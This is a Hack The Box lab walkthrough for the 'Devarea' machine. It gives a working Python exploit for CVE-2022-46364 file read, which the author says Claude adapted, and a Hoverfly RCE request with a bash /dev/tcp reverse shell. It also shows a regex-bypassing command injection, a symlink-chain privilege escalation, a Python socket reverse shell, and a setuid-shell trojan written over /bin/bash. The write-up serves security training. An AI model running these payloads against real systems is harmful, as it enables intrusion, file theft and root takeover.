---
title: "HTB Devarea walkthrough"
date: 2026-03-29
categories: [HTB, Season 10]
tags:  [ CVE-2022-46364, CVE-2025-54123, command injection, symlink abuse,]
---





Start off with the nmap scan

The scan shows ports 21, 22, 80, 8080, 8500, and 8888 open. Port 21 is FTP, on 80 there is a static site so not much there, ports 8080 and 8500 look like some proxy server, and on port 8888 is a Hoverfly dashboard which has a login page so we need creds for it.

```bash
# Nmap 7.98 scan initiated Sat Mar 28 15:03:46 2026 as: /usr/lib/nmap/nmap -T4 -A -p- -o nmap.txt 10.129.21.201
Nmap scan report for 10.129.21.201
Host is up (0.071s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Sep 22  2025 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.15.50
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 83:13:6b:a1:9b:28:fd:bd:5d:2b:ee:03:be:9c:8d:82 (ECDSA)
|_  256 0a:86:fa:65:d1:20:b4:3a:57:13:d1:1a:c2:de:52:78 (ED25519)
80/tcp   open  http    Apache httpd 2.4.58
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Did not follow redirect to http://devarea.htb/
8080/tcp open  http    Jetty 9.4.27.v20200227
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(9.4.27.v20200227)
8500/tcp open  http    Golang net/http server
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 500 Internal Server Error
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Sat, 28 Mar 2026 19:06:09 GMT
|     Content-Length: 64
|     This is a proxy server. Does not respond to non-proxy requests.
|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 500 Internal Server Error
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Sat, 28 Mar 2026 19:05:53 GMT
|     Content-Length: 64
|_    This is a proxy server. Does not respond to non-proxy requests.
8888/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Hoverfly Dashboard
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8500-TCP:V=7.98%I=7%D=3/28%Time=69C82690%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,E9,"HTTP/1\.0\x20500\x20Internal\x20Server\x20
SF:Error\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Typ
SF:e-Options:\x20nosniff\r\nDate:\x20Sat,\x2028\x20Mar\x202026\x2019:05:53
SF:\x20GMT\r\nContent-Length:\x2064\r\n\r\nThis\x20is\x20a\x20proxy\x20ser
SF:ver\.\x20Does\x20not\x20respond\x20to\x20non-proxy\x20requests\.\n")%r(
SF:HTTPOptions,E9,"HTTP/1\.0\x20500\x20Internal\x20Server\x20Error\r\nCont
SF:ent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Type-Options:\x2
SF:0nosniff\r\nDate:\x20Sat,\x2028\x20Mar\x202026\x2019:05:53\x20GMT\r\nCo
SF:ntent-Length:\x2064\r\n\r\nThis\x20is\x20a\x20proxy\x20server\.\x20Does
SF:\x20not\x20respond\x20to\x20non-proxy\x20requests\.\n")%r(RTSPRequest,6
SF:7,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x
SF:20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%
SF:r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
SF:quest")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConte
SF:nt-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\
SF:n400\x20Bad\x20Request")%r(FourOhFourRequest,E9,"HTTP/1\.0\x20500\x20In
SF:ternal\x20Server\x20Error\r\nContent-Type:\x20text/plain;\x20charset=ut
SF:f-8\r\nX-Content-Type-Options:\x20nosniff\r\nDate:\x20Sat,\x2028\x20Mar
SF:\x202026\x2019:06:09\x20GMT\r\nContent-Length:\x2064\r\n\r\nThis\x20is\
SF:x20a\x20proxy\x20server\.\x20Does\x20not\x20respond\x20to\x20non-proxy\
SF:x20requests\.\n")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\
SF:r\n\r\n400\x20Bad\x20Request")%r(SIPOptions,67,"HTTP/1\.1\x20400\x20Bad
SF:\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnect
SF:ion:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Socks5,67,"HTTP/1\.1\x20
SF:400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\
SF:r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: Host: _; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   71.44 ms 10.10.14.1
2   71.05 ms 10.129.21.201

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Mar 28 15:06:25 2026 -- 1 IP address (1 host up) scanned in 158.68 seconds

```



## USER FLAG

Get the file from ftp

```bash
26 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> mget *
mget employee-service.jar [anpqy?]? y
229 Entering Extended Passive Mode (|||43806|)
150 Opening BINARY mode data connection for employee-service.jar (6445030 bytes).
100% |************************************************************************************************************|  6293 KiB    1.49 MiB/s    00:00 ETA
226 Transfer complete.
6445030 bytes received in 00:04 (1.46 MiB/s)
ftp> exit
221 Goodbye.
             
```



Decompile with jadx

```bash
 jadx -d ~/htb/reds/devarea/decompile ~/htb/reds/devarea/employee-service.jar
INFO  - loading ...
INFO  - processing ...
ERROR - finished with errors, count: 10    
```



Looking through the decompiled code there is a SOAP web services app on port 8080 that uses Apache CXF with a vulnerable version to CVE-2022-46364. It's SSRF that will enable us file read on host with the privileges of the user running it and it's running as dev_ryan. Ask Claude to adjust the script from <https://github.com/kasem545/CVE-2022-46364-Poc> and it does. Replace TARGET_URL and DOMAIN.

```bash
#!/usr/bin/env python3
"""
CVE-2022-46364 | Apache CXF SSRF - Interactive File Reader
"""

import base64
import re
import sys
import urllib.request
import urllib.error

TARGET = "TARGET_URL"
DOMAIN = "DOMAIN"
BOUNDARY = "MIMEBoundary"

class Colors:
    CYAN   = '\033[96m'
    GREEN  = '\033[92m'
    YELLOW = '\033[93m'
    GREY   = '\033[90m'
    BOLD   = '\033[1m'
    END    = '\033[0m'

def fetch_path(path: str):
    soap = f"""<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:dev="http://{DOMAIN}/">
  <soapenv:Body>
    <dev:submitReport>
      <arg0>
        <content><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file://{path}"/></content>
        <employeeName>test</employeeName>
        <department>IT</department>
        <confidential>false</confidential>
      </arg0>
    </dev:submitReport>
  </soapenv:Body>
</soapenv:Envelope>"""

    body = (
        f"--{BOUNDARY}\r\n"
        f'Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"\r\n'
        f"Content-ID: <rootpart@example.com>\r\n"
        f"\r\n"
        f"{soap}\r\n"
        f"--{BOUNDARY}--\r\n"
    ).encode()

    content_type = (
        f'multipart/related; type="application/xop+xml"; '
        f'start="<rootpart@example.com>"; '
        f'start-info="text/xml"; '
        f'boundary="{BOUNDARY}"'
    )

    req = urllib.request.Request(
        TARGET, data=body, method="POST",
        headers={"Content-Type": content_type, "SOAPAction": '""'}
    )

    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            raw = r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        raw = e.read().decode(errors="replace")
    except Exception as e:
        print(f"{Colors.YELLOW}[!] Request failed: {e}{Colors.END}")
        return

    # Extract <return>...</return>
    m = re.search(r'<return>(.*?)</return>', raw, re.DOTALL)
    if not m:
        print(f"{Colors.YELLOW}[!] No result (file missing, empty, or permission denied){Colors.END}")
        return

    content = m.group(1).strip()
    # Strip standard prefix
    b64 = re.sub(r'^Report received from test\. Department: IT\. Content: ', '', content)

    if not b64:
        print(f"{Colors.YELLOW}[!] No result (file missing, empty, or permission denied){Colors.END}")
        return

    try:
        decoded = base64.b64decode(b64).decode(errors="replace")
        print(f"{Colors.GREEN}[+] Got it:{Colors.END}")
        print(decoded)
    except Exception:
        print(f"{Colors.GREEN}[+] Got it (raw):{Colors.END}")
        print(b64)


def main():
    print(f"{Colors.BOLD}{Colors.CYAN} CVE-2022-46364 CXF MTOM SSRF Reader | Ctrl+C to exit{Colors.END}")
    print(f"{Colors.BOLD}{Colors.CYAN} Target: {TARGET}{Colors.END}\n")

    while True:
        try:
            path = input(f"{Colors.YELLOW}path> {Colors.END}").strip()
        except (KeyboardInterrupt, EOFError):
            print("\nBye.")
            sys.exit(0)

        if not path:
            continue

        print(f"{Colors.GREY}[*] Fetching {path} ...{Colors.END}")
        fetch_path(path)
        print()

if __name__ == "__main__":
    main()
```





Since we know that Hoverfly is running we can look for its service file **"/etc/systemd/system/hoverfly.service"** which might have some creds and it does.

![devarea01](/assets/img/posts/htb-devarea/devarea01.png)



Hoverfly is v1.11.3 which is vulnerable to RCE. There is an official advisory with a PoC here <https://github.com/SpectoLabs/hoverfly/security/advisories/GHSA-r4h8-hfp2-ggmf> . So we construct the payload and get a shell.

```bash
PUT /api/v2/hoverfly/middleware HTTP/1.1
Host: devarea.htb:8888
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIwODU4MjE5MTAsImlhdCI6MTc3NDc4MTkxMCwic3ViIjoiIiwidXNlcm5hbWUiOiJhZG1pbiJ9.OTKCSwxjnEYg2qw4-ne21Bk0H-N972rz9jE18sOoqNvDexm6mH3dgyqrBZYcb9sCGA4p18qfIgYqW76ottU9Lg
Connection: keep-alive
Referer: http://devarea.htb:8888/dashboard
Content-Length: 106

{
    "binary": "/bin/bash",
    "script": "bash -c '/bin/bash -i >& /dev/tcp/10.10.15.50/9001 0>&1'"
}
```



![devarea02](/assets/img/posts/htb-devarea/devarea02.png)



User dev_ryan is in sudoers and can run /opt/syswatch/syswatch.sh but not /opt/syswatch/syswatch.sh web-stop or /opt/syswatch/syswatch.sh web-restart.

![devarea03](/assets/img/posts/htb-devarea/devarea03.png)



## ROOT FLAG



Now from here there are two ways to get the root.txt which I will explain next.

**1.**

There is a zipfile that looks like the backup of the syswatch app and looking through it we can find a command injection of the service on port 7777 that runs as syswatch user. 

The Vulnerable Code
```python
SAFE_SERVICE = re.compile(r"^[^;/\&.<>\rA-Z]*$")

def service_status():
    service = request.form.get("service", "").strip()
    if not service or not SAFE_SERVICE.match(service):
        error = "Invalid service name"
    else:
        res = subprocess.run(
            [f"systemctl status --no-pager {service}"],
            shell=True,
            capture_output=True, text=True, timeout=10
        )
```



With `shell=True` and a single string, Python passes the entire thing to `/bin/sh -c "..."`. The shell then interprets special characters  `|`, `||`, `&&`, backticks, `$()`  as shell operators. The user input is no longer data; it becomes part of the command syntax. There is also the regex which can be bypassed especially since we know what is forbidden. The easiest way is to create a shell in tmp with the dev_ryan session and then execute it with the command injection as syswatch.

So **echo '/bin/bash -i >& /dev/tcp/10.10.14.34/9001 0>&1' > /tmp/shell** and then execute:

```bash
curl -s -b "session=$COOKIE" -X POST http://127.0.0.1:7777/service-status \
  -d 'service=x||bash $(pwd|cut -c1)tmp$(pwd|cut -c1)shell'

```



**The Symlink Vulnerability in view_logs**



**The Vulnerable Code**

```bash
view_logs() {
    local file="${arg:-system.log}"
    local path="$LOG_DIR/$file"

    if [ -L "$path" ]; then
        local target
        target=$(ls -l "$path" | awk '{print $NF}')

        if [[ "$target" == *"/"* || "$target" == *".."* || "$target" == *"\\"* ]]; then
            echo "[Blocked unsafe symlink target]: $file -> $target"
            return 1
        fi

        if [[ "$target" =~ ^[A-Za-z0-9_.-]+$ ]]; then
            local resolved="$LOG_DIR/$target"
            if [ -f "$resolved" ]; then
                cat "$resolved"
                return
            fi
        fi

        if [[ "$target" == /var/log/* ]]; then
            [ -f "$target" ] && cat "$target" && return
        fi

        echo "[Refusing unsafe symlink]: $file -> $target"
        return 1
    fi

    cat "$path"
}
```

### 

**The Three-Layer Defence and Why Each Failed**

The developer built what looks like a layered defence. Let's walk through each layer.

**Layer 1  Block absolute paths:**



```bash
if [[ "$target" == *"/"* || "$target" == *".."* ]]; then
    echo "[Blocked unsafe symlink target]"
    return 1
fi
```

This blocks targets containing `/` or `..`  so you can't do `ln -s /root/root.txt r.log` directly. That symlink's target is `/root/root.txt`, which contains `/`, and gets caught here.

**Layer 2  Allow only safe-looking filenames:**



```bash
if [[ "$target" =~ ^[A-Za-z0-9_.-]+$ ]]; then
    local resolved="$LOG_DIR/$target"
    if [ -f "$resolved" ]; then
        cat "$resolved"
    fi
fi
```

If the target looks like a plain filename,  only alphanumeric, dots, dashes, underscores,  treat it as safe. Resolve it back into the log directory and read it.

The developer's mental model here is: *a relative filename with no slashes or dotdot must stay inside the log directory.* That reasoning is correct for one hop. The mistake is assuming `cat "$resolved"` operates at the same level of abstraction as the validation.

**Layer 3  Allow `/var/log/` explicitly:**

```bash
if [[ "$target" == /var/log/* ]]; then
    [ -f "$target" ] && cat "$target" && return
fi
```

An intentional escape hatch,  symlinks into `/var/log/` are permitted because `log_monitor.sh` legitimately monitors those files. This would have been another attack path if `syswatch` could write to `/var/log/`.



**The Core Mistake: Single-Hop Validation, Multi-Hop Resolution**

The validation inspects **one level** of indirection:

```bash
target=$(ls -l "$path" | awk '{print $NF}')
# target = "root.txt" -- looks safe, passes regex
```

But `cat "$resolved"` asks the **kernel** to resolve the path, and the kernel follows **every** symlink in the chain without limit (up to `MAXSYMLINKS`, typically 40).

```
view_logs inspects:    r.log -> root.txt         ← validation happens here
kernel resolves:       r.log -> root.txt -> /root/root.txt  ← read happens here
```

The validation and the file access operate at different levels. The code trusts that `$LOG_DIR/root.txt` is a regular file because it passed `[ -f ]`  but `[ -f ]` itself follows symlinks. It returns true if the **final resolved target** is a regular file, regardless of how many hops it took.

------

 

**The Exploit Chain Step by Step**

```bash
# Step 1: create the decoy - plain filename, passes the regex
ln -s root.txt /opt/syswatch/logs/r.log

# Step 2: create the escape - never inspected by view_logs
ln -s /root/root.txt /opt/syswatch/logs/root.txt


When 'sudo syswatch.sh logs r.log' runs:

1. path = /opt/syswatch/logs/r.log
2. [ -L "$path" ] -> true, it's a symlink
3. target = $(ls -l ... | awk '{print $NF}') -> "root.txt"
4. "root.txt" contains no "/" or ".." -> passes layer 1
5. "root.txt" matches ^[A-Za-z0-9_.-]+$ -> passes layer 2
6. resolved = /opt/syswatch/logs/root.txt
7. [ -f "$resolved" ] -> kernel follows root.txt -> /root/root.txt -> true
8. cat "$resolved" -> kernel follows root.txt -> /root/root.txt -> reads flag
```

The validator only ever saw `root.txt`. The kernel saw `/root/root.txt`.

------

```bash
syswatch@devarea:~$ ln -s root.txt /opt/syswatch/logs/r.log
syswatch@devarea:~$ ln -s /root/root.txt /opt/syswatch/logs/root.txt

```

And we get the root flag

```bash
dev_ryan@devarea:~$ sudo /opt/syswatch/syswatch.sh logs r.log
4e96...

```







**2.**

The /bin/bash is world writeable so just switch the shell to sh/dash, kill all the bash processes running because otherwise we can't overwrite it, then make a malicious bash and execute it to get the shell.



Switch the shell

```bash 
dev_ryan@devarea:~$ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.50",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")' &

```

```bash
nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.15.50] from (UNKNOWN) [10.129.23.90] 57822
$ python3 -c 'import pty;pty.spawn("/bin/sh")'
python3 -c 'import pty;pty.spawn("/bin/sh")'
$ export TERM=xterm
export TERM=xterm
$ ^Z
zsh: suspended  nc -lvnp 9001
                                                                                                                                                         
┌──(kali㉿kali)-[~/htb/reds/devarea/decompiled]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 9001
                               stty rows 33 columns 153

```

Kill the processes

```bash
$ ps aux | grep bash
dev_ryan    7845  0.0  0.1   8908  5836 pts/0    Ss+  11:23   0:00 -bash
dev_ryan    8073  0.0  0.0   8908  3356 pts/0    T    11:28   0:00 -bash
dev_ryan    8310  0.0  0.0   6544  2280 pts/2    S+   11:32   0:00 grep bash
$ kill -9 7845 8073
$ ps aux | grep bash
dev_ryan    8313  0.0  0.0   6544  2280 pts/2    S+   11:33   0:00 grep bash
```



Make the malicious bash and execute

```bash
$ dash -c 'cat > /bin/bash << EOF
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod 4755 /tmp/rootsh
exec /bin/sh "\$@"
EOF
$ sudo /opt/syswatch/syswatch.sh plugins
/opt/syswatch/syswatch.sh: 2: set: Illegal option -o pipefail

```

```bash
$ /tmp/rootsh -p
# id
uid=1001(dev_ryan) gid=1001(dev_ryan) euid=0(root) groups=1001(dev_ryan)

```



 

